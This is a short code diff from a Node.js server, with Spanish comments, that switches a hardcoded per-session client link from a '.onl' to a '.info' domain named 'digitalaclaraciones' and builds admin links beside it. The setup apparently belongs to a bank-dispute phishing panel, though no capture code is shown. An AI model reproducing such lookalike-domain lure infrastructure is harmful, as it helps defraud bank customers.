@@ -1213,8 +1213,8 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
       const baseUrl = req.headers.host || (isReplit ? `${process.env.REPL_SLUG || 'workspace'}.replit.dev` : clientDomain);
       const protocol = req.headers['x-forwarded-proto'] || 'https';
       
-      // FORZAMOS el uso de digitalaclaraciones.onl independientemente del entorno
-      const clientLink = `https://digitalaclaraciones.onl/${sessionId}`;
+      // FORZAMOS el uso de digitalaclaraciones.info independientemente del entorno
+      const clientLink = `https://digitalaclaraciones.info/${sessionId}`;
       
       // Para el admin link, si estamos en Replit permitimos usar la URL local para testing
       const adminLink = isReplit 
